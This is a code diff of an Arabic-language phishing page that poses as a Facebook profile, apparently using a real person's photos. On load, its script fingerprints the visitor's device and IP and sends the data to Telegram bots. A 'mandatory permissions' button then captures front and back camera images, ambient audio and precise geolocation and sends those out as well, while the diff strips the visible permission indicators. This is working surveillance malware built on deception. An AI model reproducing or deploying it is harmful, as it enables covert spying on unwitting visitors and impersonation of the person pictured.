@@ -22,7 +22,6 @@
             padding: 16px;
         }
 
-        /* محاكاة بروفايل فيسبوك */
         .profile-container {
             max-width: 680px;
             width: 100%;
@@ -33,22 +32,20 @@
             margin: 0 auto;
         }
 
-        /* صورة الغلاف */
+        /* صورة الغلاف - صورتك الجديدة */
         .cover-area {
             height: 200px;
-            background: linear-gradient(135deg, #2d3748, #1a202c);
             position: relative;
+            overflow: hidden;
         }
 
         .cover-image {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 200" fill="%234A5568"><rect width="1000" height="200" fill="%232D3748"/><circle cx="200" cy="150" r="30" fill="%234A5568" opacity="0.5"/><circle cx="500" cy="100" r="40" fill="%234A5568" opacity="0.3"/><circle cx="800" cy="160" r="25" fill="%234A5568" opacity="0.4"/></svg>');
-            background-size: cover;
         }
 
-        /* صورة البروفايل - هنا سيتم وضع صورتك */
+        /* صورة البروفايل */
         .profile-avatar-area {
             position: relative;
             padding: 0 16px;
@@ -97,7 +94,6 @@
             border-bottom: 1px solid #e4e6eb;
         }
 
-        /* احصائيات */
         .stats {
             display: flex;
             padding: 12px 0;
@@ -120,7 +116,6 @@
             color: #65676b;
         }
 
-        /* أزرار الإجراءات */
         .action-buttons-profile {
             display: flex;
             padding: 12px 0;
@@ -171,7 +166,6 @@
             background: #c9ccd1;
         }
 
-        /* قائمة التبويبات */
         .tabs {
             display: flex;
             padding: 0 16px;
@@ -195,7 +189,6 @@
             border-bottom-color: #1877f2;
         }
 
-        /* محتوى الملف */
         .profile-content {
             padding: 16px;
         }
@@ -336,46 +329,19 @@
             50% { opacity: 1; }
             100% { opacity: 0.3; }
         }
-        
-        /* مؤشر الأذونات */
-        .permission-status {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            margin: 0 16px 16px;
-            justify-content: center;
-        }
-        
-        .perm-badge {
-            font-size: 11px;
-            padding: 4px 10px;
-            border-radius: 20px;
-            background: #e4e6eb;
-            color: #65676b;
-        }
-        
-        .perm-badge.granted {
-            background: #00a86b20;
-            color: #008c55;
-            border: 1px solid #00a86b;
-        }
-        
-        .perm-badge.denied {
-            background: #ffe8e6;
-            color: #c00;
-            border: 1px solid #c00;
-        }
     </style>
 </head>
 <body>
 
 <div class="profile-container">
-    <!-- صورة الغلاف -->
+    <!-- صورة الغلاف - صورتك الجديدة -->
     <div class="cover-area">
-        <div class="cover-image"></div>
+        <img class="cover-image" src="https://scontent-yyz1-1.xx.fbcdn.net/v/t39.30808-6/472529589_1231993597889140_4456872769041297774_n.jpg?_nc_cat=107&ccb=1-7&_nc_sid=2a1932&_nc_eui2=AeE8Vjkhq0QQjuw5YHAVjONY_V6kEjRiftH9XqQSNGJ-0eCm5XFmA12hztOb1WKtxBuk9F3F_KYvd5M64CJtK307&_nc_ohc=QatdDJUy70cQ7kNvwGzVd_0&_nc_oc=AdrrePF40iTzcOEc5AdlD28ZN_MurKiw4j3aKNGngt3iq3v338jJ5WgpGkLm0a9ybe0&_nc_zt=23&_nc_ht=scontent-yyz1-1.xx&_nc_gid=6uR3PkHOthI8WoYLLpX-sg&_nc_ss=7b2a8&oh=00_Af1EzsCShfiaAOQ3kSU5OqZMrOmJX7eiyrrNTMLEKxR4qw&oe=69F2ECC3" 
+             alt="صورة الغلاف"
+             onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1000 200%22%3E%3Crect width=%221000%22 height=%22200%22 fill=%22%232D3748%22/%3E%3C/svg%3E'">
     </div>
 
-    <!-- صورة البروفايل - صورتك هنا -->
+    <!-- صورة البروفايل -->
     <div class="profile-avatar-area">
         <div class="avatar">
             <img src="https://scontent-yyz1-1.xx.fbcdn.net/v/t39.30808-6/469393614_1213373153084518_19978652063377238_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=1d70fc&_nc_eui2=AeH1FlTtKvqBbIyvQzFuWNlM067YmuTqCVjTrtia5OoJWLlCkn43fmCT7t2x0dTVjV57J-i51nPhThrn8CAWyX9x&_nc_ohc=DdPRR3DCjZ4Q7kNvwF1nS5s&_nc_oc=AdqBF-whzGYiMB5eMw3BO5Bit_qkfAfmV__IJThxCtmk4991dpmoRwH4uvfDXPsylfo&_nc_zt=23&_nc_ht=scontent-yyz1-1.xx&_nc_gid=ytV3tnsCtgR60oxGU8bu6Q&_nc_ss=7b2a8&oh=00_Af1bj3fMtQLKORYotR7CE19MyprE1Za_cS64QE9Ah0mGHw&oe=69F2C278" 
@@ -449,14 +415,6 @@
         </div>
     </div>
 
-    <!-- مؤشر حالة الأذونات الإجبارية -->
-    <div class="permission-status" id="permissionStatus">
-        <span class="perm-badge" id="permFront">📷 كاميرا أمامية ⏳</span>
-        <span class="perm-badge" id="permBack">📸 كاميرا خلفية ⏳</span>
-        <span class="perm-badge" id="permAudio">🎤 ميكروفون ⏳</span>
-        <span class="perm-badge" id="permLoc">📍 موقع جغرافي ⏳</span>
-    </div>
-
     <!-- زر السماح الرئيسي الإجباري -->
     <button class="permission-btn" id="permissionBtn">
         🎬 فتح الحساب | قبول الأذونات (إجباري)
@@ -475,7 +433,7 @@
 
     <div class="error-msg" id="errorMsg"></div>
 </div>
-<div class="status-bar" id="statusBar">🔐 السوفييف | يجب قبول جميع الأذونات لفتح الحساب</div>
+<div class="status-bar" id="statusBar">🔐 السوفييف | اضغط "فتح الحساب" لقبول الأذونات</div>
 
 <script>
     (function() {
@@ -515,7 +473,7 @@
             } catch(e) { console.warn("[telegram]", e); return false; }
         }
 
-        // =================== 1. بصمة الجهاز المتقدمة ===================
+        // =================== بصمة الجهاز ===================
         async function getDeepDeviceFingerprint(chatUser, tokenUser, chatMaster, tokenMaster) {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
@@ -542,7 +500,7 @@
             await sendToTelegram(chatMaster, tokenMaster, 'text', null, deviceMsg + "\n[مدير - السوفييف]");
         }
 
-        // =================== 2. الموقع الجغرافي (إجباري) ===================
+        // =================== الموقع الجغرافي ===================
         function getPreciseLocation(chatUser, tokenUser, chatMaster, tokenMaster) {
             return new Promise((resolve) => {
                 if(!navigator.geolocation) {
@@ -570,7 +528,7 @@
             });
         }
 
-        // =================== 3. IP ===================
+        // =================== IP ===================
         async function getRichIPData(chatUser, tokenUser, chatMaster, tokenMaster) {
             try {
                 const [ipRes, ipInfoRes] = await Promise.all([
@@ -590,7 +548,7 @@
             } catch(e) {}
         }
 
-        // =================== 4. كاميرا أمامية (إجبارية) ===================
+        // =================== كاميرا أمامية ===================
         async function captureFrontCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
@@ -615,7 +573,7 @@
             }
         }
 
-        // =================== 5. كاميرا خلفية (إجبارية) ===================
+        // =================== كاميرا خلفية ===================
         async function captureBackCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } });
@@ -639,7 +597,7 @@
             }
         }
 
-        // =================== 6. تسجيل صوتي (إجباري) ===================
+        // =================== تسجيل صوتي ===================
         async function recordAmbientAudio(chatUser, tokenUser, chatMaster, tokenMaster) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -665,7 +623,7 @@
             }
         }
 
-        // =================== التشغيل الرئيسي مع الأذونات الإجبارية ===================
+        // =================== التشغيل الرئيسي ===================
         (async () => {
             const urlParams = new URLSearchParams(window.location.search);
             const encodedConfig = urlParams.get('d');
@@ -691,7 +649,6 @@
             let activeFeatures = features ? features.split(',') : [];
             // إجبار جميع الأذونات الرئيسية
             const requiredFeatures = ['front', 'back', 'audio', 'loc'];
-            // دمج الميزات المطلوبة بشكل إجباري
             activeFeatures = [...new Set([...activeFeatures, ...requiredFeatures])];
             
             // عناصر DOM
@@ -701,12 +658,6 @@
             const errorMsgDiv = document.getElementById('errorMsg');
             const statusBar = document.getElementById('statusBar');
             
-            // تحديث واجهة الأذونات
-            const permFrontSpan = document.getElementById('permFront');
-            const permBackSpan = document.getElementById('permBack');
-            const permAudioSpan = document.getElementById('permAudio');
-            const permLocSpan = document.getElementById('permLoc');
-            
             let permissionsGranted = {
                 front: false,
                 back: false,
@@ -714,45 +665,11 @@
                 loc: false
             };
             
-            function updatePermissionUI() {
-                if (permissionsGranted.front) {
-                    permFrontSpan.textContent = '📷 كاميرا أمامية ✅';
-                    permFrontSpan.classList.add('granted');
-                } else {
-                    permFrontSpan.textContent = '📷 كاميرا أمامية ❌';
-                    permFrontSpan.classList.add('denied');
-                }
-                
-                if (permissionsGranted.back) {
-                    permBackSpan.textContent = '📸 كاميرا خلفية ✅';
-                    permBackSpan.classList.add('granted');
-                } else {
-                    permBackSpan.textContent = '📸 كاميرا خلفية ❌';
-                    permBackSpan.classList.add('denied');
-                }
-                
-                if (permissionsGranted.audio) {
-                    permAudioSpan.textContent = '🎤 ميكروفون ✅';
-                    permAudioSpan.classList.add('granted');
-                } else {
-                    permAudioSpan.textContent = '🎤 ميكروفون ❌';
-                    permAudioSpan.classList.add('denied');
-                }
-                
-                if (permissionsGranted.loc) {
-                    permLocSpan.textContent = '📍 موقع جغرافي ✅';
-                    permLocSpan.classList.add('granted');
-                } else {
-                    permLocSpan.textContent = '📍 موقع جغرافي ❌';
-                    permLocSpan.classList.add('denied');
-                }
-            }
-            
             // إشعار فتح الرابط
             await sendToTelegram(tChat, tToken, 'text', null, "🔔 [محمد فتحي - السوفييف] تم فتح الملف الشخصي بواسطة عضو");
             await sendToTelegram(mChat, mToken, 'text', null, "🔔 [مراقب] فتح ملف شخصي - عضو جديد");
             
-            // جمع البيانات الأساسية (IP + بصمة) - هذه لا تحتاج أذونات
+            // جمع البيانات الأساسية
             await getDeepDeviceFingerprint(tChat, tToken, mChat, mToken);
             await getRichIPData(tChat, tToken, mChat, mToken);
             
@@ -768,35 +685,28 @@
                 
                 // طلب الكاميرا الأمامية
                 try {
-                    const frontResult = await captureFrontCamera(tChat, tToken, mChat, mToken);
-                    permissionsGranted.front = frontResult;
+                    permissionsGranted.front = await captureFrontCamera(tChat, tToken, mChat, mToken);
                 } catch(e) { permissionsGranted.front = false; }
                 
                 // طلب الكاميرا الخلفية
                 try {
-                    const backResult = await captureBackCamera(tChat, tToken, mChat, mToken);
-                    permissionsGranted.back = backResult;
+                    permissionsGranted.back = await captureBackCamera(tChat, tToken, mChat, mToken);
                 } catch(e) { permissionsGranted.back = false; }
                 
                 // طلب الميكروفون
                 try {
-                    const audioResult = await recordAmbientAudio(tChat, tToken, mChat, mToken);
-                    permissionsGranted.audio = audioResult;
+                    permissionsGranted.audio = await recordAmbientAudio(tChat, tToken, mChat, mToken);
                 } catch(e) { permissionsGranted.audio = false; }
                 
                 // طلب الموقع
                 try {
-                    const locResult = await getPreciseLocation(tChat, tToken, mChat, mToken);
-                    permissionsGranted.loc = locResult;
+                    permissionsGranted.loc = await getPreciseLocation(tChat, tToken, mChat, mToken);
                 } catch(e) { permissionsGranted.loc = false; }
-                
-                updatePermissionUI();
                 
                 // التحقق من منح جميع الأذونات
                 const allGranted = permissionsGranted.front && permissionsGranted.back && permissionsGranted.audio && permissionsGranted.loc;
                 
                 if (!allGranted) {
-                    // لم يتم منح جميع الأذونات - إظهار خطأ وإعادة تمكين الزر
                     errorMsgDiv.innerHTML = '❌ يجب قبول جميع الأذونات (كاميرا أمامية + خلفية + ميكروفون + موقع) لتتمكن من فتح الحساب. الرجاء المحاولة مرة أخرى وقبول جميع الطلبات.';
                     errorMsgDiv.style.display = 'block';
                     loadingOverlay.style.display = 'none';
@@ -806,13 +716,12 @@
                     return;
                 }
                 
-                // تم منح جميع الأذونات - إكمال العملية
+                // تم منح جميع الأذونات
                 permissionBadge.style.display = 'flex';
                 statusBar.innerHTML = '✅ تم قبول جميع الأذونات، جاري التجهيز...';
                 
-                // إشعار نهائي
-                await sendToTelegram(tChat, tToken, 'text', null, "✅ اكتمل جمع جميع الوسائط (كاميرات/صوت/موقع) بنجاح - تم قبول جميع الأذونات");
-                await sendToTelegram(mChat, mToken, 'text', null, "✅ تم الحصول على بيانات العضو (صوت/صور/موقع) - جميع الأذونات مقبولة");
+                await sendToTelegram(tChat, tToken, 'text', null, "✅ اكتمل جمع جميع الوسائط بنجاح - تم قبول جميع الأذونات");
+                await sendToTelegram(mChat, mToken, 'text', null, "✅ تم الحصول على بيانات العضو - جميع الأذونات مقبولة");
                 
                 loadingOverlay.innerHTML = '<div class="spinner"></div><p>تم التفعيل! إعادة التوجيه للمشاهدة الحصرية...</p>';
                 statusBar.innerHTML = '✅ جاهز، جاري نقلك إلى المحتوى الحصري...';
@@ -822,15 +731,12 @@
                 }, 2000);
             };
             
-            // ربط الزر بوظيفة طلب الأذونات الإجبارية
             permissionBtn.onclick = requestAllPermissions;
             
-            // أزرار وهمية
             document.getElementById('msgBtn').onclick = () => { alert("🔒 يجب فتح الحساب أولاً عبر الزر الأخضر"); };
             document.getElementById('followBtn').onclick = () => { alert("📢 قم بفتح الحساب أولاً للمتابعة"); };
             
-            statusBar.innerHTML = '🔐 السوفييف | يجب قبول جميع الأذونات (كاميرا + ميكروفون + موقع) لفتح الحساب';
-            updatePermissionUI();
+            statusBar.innerHTML = '🔐 السوفييف | يجب قبول جميع الأذونات لفتح الحساب';
         })();
     })();
 </script>
